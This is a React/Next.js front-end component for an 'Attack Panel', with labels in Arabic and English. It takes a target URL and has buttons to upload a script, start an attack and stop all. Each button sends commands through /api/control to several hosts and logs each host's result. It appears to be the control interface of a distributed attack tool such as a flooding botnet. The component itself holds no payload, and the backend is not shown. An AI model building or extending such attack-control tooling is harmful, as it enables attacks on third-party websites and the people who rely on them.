'use client';
import { useState } from 'react';
import { Play, Square, Upload, Terminal } from 'lucide-react';

export default function Home() {
  const [url, setUrl] = useState('');
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(false);

  const addLog = (msg) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev]);

  const handleAction = async (action) => {
    if (action === 'start' && !url) return addLog("❌ Error: Please enter a URL first.");
    
    setLoading(true);
    addLog(`🚀 Sending ${action.toUpperCase()} command...`);
    
    try {
      const res = await fetch('/api/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action, url })
      });
      const data = await res.json();
      
      data.results.forEach(r => {
        if (r.status === 'success') {
          addLog(`✅ ${r.host}: ${r.output || 'Done'}`);
        } else {
          addLog(`❌ ${r.host}: ${r.error}`);
        }
      });
    } catch (err) {
      addLog(`❌ System Error: ${err.message}`);
    }
    setLoading(false);
  };

  return (
    <div className="min-h-screen bg-black text-green-500 p-8 font-mono">
      <div className="max-w-3xl mx-auto border border-green-800 p-6 rounded bg-gray-900">
        <h1 className="text-3xl font-bold mb-6 text-center border-b border-green-800 pb-4">
          ⚔️ لوحة تحكم هجوم (Attack Panel)
        </h1>

        <div className="space-y-4">
          <div>
            <label className="block mb-2 text-sm">Target URL (الرابط المستهدف)</label>
            <input 
              type="text" 
              value={url}
              onChange={(e) => setUrl(e.target.value)}
              placeholder="https://example.com"
              className="w-full bg-black border border-green-700 p-3 rounded text-white focus:outline-none focus:border-green-500"
            />
          </div>

          <div className="grid grid-cols-3 gap-4 mt-6">
            <button 
              onClick={() => handleAction('deploy')}
              disabled={loading}
              className="flex items-center justify-center gap-2 bg-blue-900 hover:bg-blue-800 text-white p-4 rounded transition disabled:opacity-50"
            >
              <Upload size={20} /> 1. رفع السكريبت
            </button>

            <button 
              onClick={() => handleAction('start')}
              disabled={loading}
              className="flex items-center justify-center gap-2 bg-red-900 hover:bg-red-800 text-white p-4 rounded transition disabled:opacity-50"
            >
              <Play size={20} /> 2. بدء الهجوم
            </button>

            <button 
              onClick={() => handleAction('stop')}
              disabled={loading}
              className="flex items-center justify-center gap-2 bg-gray-700 hover:bg-gray-600 text-white p-4 rounded transition disabled:opacity-50"
            >
              <Square size={20} /> إيقاف الكل
            </button>
          </div>
        </div>

        <div className="mt-8">
          <div className="flex items-center gap-2 mb-2 text-sm text-gray-400">
            <Terminal size={16} /> System Logs
          </div>
          <div className="bg-black border border-green-900 h-64 overflow-y-auto p-4 rounded text-xs font-mono">
            {logs.length === 0 ? <span className="text-gray-600">Waiting for commands...</span> : logs.map((log, i) => (
              <div key={i} className="mb-1 border-b border-gray-900 pb-1">{log}</div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}
// Final build trigger
